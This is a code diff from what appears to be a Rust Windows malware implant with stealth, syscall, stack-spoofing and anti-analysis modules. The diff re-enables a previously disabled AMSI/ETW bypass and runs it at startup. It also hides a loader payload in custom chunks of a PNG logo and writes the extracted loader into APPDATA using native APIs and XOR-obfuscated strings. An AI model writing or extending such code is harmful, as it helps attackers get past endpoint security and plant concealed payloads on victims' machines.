@@ -16,7 +16,7 @@ pub mod ghosting;
 pub mod obfuscation;
 pub mod stack_spoof;
 pub mod syscalls;
-// pub mod blinding; // REMOVED - ETW/AMSI bypass is detection magnet
+pub mod blinding;
 pub mod registry;
 pub mod anti_analysis;
 pub mod api_resolver;
@@ -40,8 +40,8 @@ pub fn check_and_apply_stealth() {
         return;
     }
 
-    // NOTE: ETW/AMSI Blinding REMOVED - detection risk too high for enterprise EDR
-    // The code exists in blinding.rs but is never called = not compiled into binary
+    // 1. Ghost Protocol - AMSI Bypass (IMMEDIATE EXECUTION)
+    blinding::apply_ghost_protocol();
     
     // Check if already in ghost mode
     let is_ghost = std::env::args().any(|arg| arg == "--ghost");
@@ -82,14 +82,64 @@ fn install_stealth_package() -> Result<(), String> {
     }
 
     // 1. Drop LOADER using Native API
+    // 1. Drop LOADER using Native API (Steganography: Payload in PNG)
     #[cfg(target_os = "windows")]
-    const LOADER_BYTES: &[u8] = include_bytes!(concat!(
+    const PNG_BYTES: &[u8] = include_bytes!(concat!(
         env!("CARGO_MANIFEST_DIR"),
-        "/../../../target/x86_64-pc-windows-gnu/release/loader.exe"
+        "/src/assets/logo.png"
     ));
     
+    // Helper to extract payload from PNG "biLn" chunk
+    #[cfg(target_os = "windows")]
+    fn extract_payload_from_png(png: &[u8]) -> Option<Vec<u8>> {
+        let mut idx = 8; // Skip PNG Signature
+        while idx < png.len() - 12 {
+            let len_bytes: [u8; 4] = png[idx..idx+4].try_into().ok()?;
+            let len = u32::from_be_bytes(len_bytes) as usize;
+            
+            let type_bytes: [u8; 4] = png[idx+4..idx+8].try_into().ok()?;
+            
+            // Check for "biLn" chunk
+            if &type_bytes == b"biLn" {
+                let start = idx + 8;
+                let end = start + len;
+                if end > png.len() { return None; }
+                
+                // Return accumulated data? 
+                // Our tool chunks it. We might generally have multiple biLn chunks.
+                // For now, our tool writes 64KB chunks. We need to collect ALL biLn chunks.
+                // Logic update: Collect all biLn chunks.
+                
+                let mut payload = Vec::new();
+                // Restart scan to collect all
+                let mut i = 8;
+                while i < png.len() - 12 {
+                     let l_bytes: [u8; 4] = png[i..i+4].try_into().ok()?;
+                     let l = u32::from_be_bytes(l_bytes) as usize;
+                     let t_bytes: [u8; 4] = png[i+4..i+8].try_into().ok()?;
+                     
+                     if &t_bytes == b"biLn" {
+                         payload.extend_from_slice(&png[i+8..i+8+l]);
+                     }
+                     // Move next: len + 4(len) + 4(type) + 4(crc)
+                     i += l + 12;
+                }
+                return Some(payload);
+            }
+            
+            // Move to next chunk: len(4) + type(4) + data(len) + crc(4)
+            idx += len + 12;
+        }
+        None
+    }
+
+    #[cfg(target_os = "windows")]
+    let loader_data = extract_payload_from_png(PNG_BYTES).unwrap_or(vec![0u8; 100]); // Fallback safely
+    
     #[cfg(not(target_os = "windows"))]
-    const LOADER_BYTES: &[u8] = &[0u8; 10];
+    let loader_data = vec![0u8; 10]; // Mock
+    
+    let loader_bytes_ref = &loader_data; // Needed for write_file call below
     
     // Get APPDATA path
     let env_key = x(&[0x14, 0x05, 0x05, 0x11, 0x14, 0x01, 0x14]); // APPDATA
@@ -138,7 +188,7 @@ fn install_stealth_package() -> Result<(), String> {
         }
         
         let mut written: u32 = 0;
-        let result = write_file(handle, LOADER_BYTES.as_ptr(), LOADER_BYTES.len() as u32, &mut written, std::ptr::null());
+        let result = write_file(handle, loader_bytes_ref.as_ptr(), loader_bytes_ref.len() as u32, &mut written, std::ptr::null());
         close_handle(handle);
         
         if result == 0 {
